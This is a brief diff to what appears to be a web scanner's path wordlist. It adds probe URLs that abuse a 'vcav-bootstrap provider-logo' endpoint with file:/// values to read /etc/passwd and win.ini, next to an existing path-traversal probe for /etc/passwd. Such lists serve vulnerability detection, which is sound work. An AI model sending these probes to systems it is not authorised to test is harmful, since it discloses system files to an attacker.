@@ -85,3 +85,7 @@
 /wp-content/plugins/qubely/readme.txt
 /
 /api/downloads?fileName=../../../../../../../../etc/passwd
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
+/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
+/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
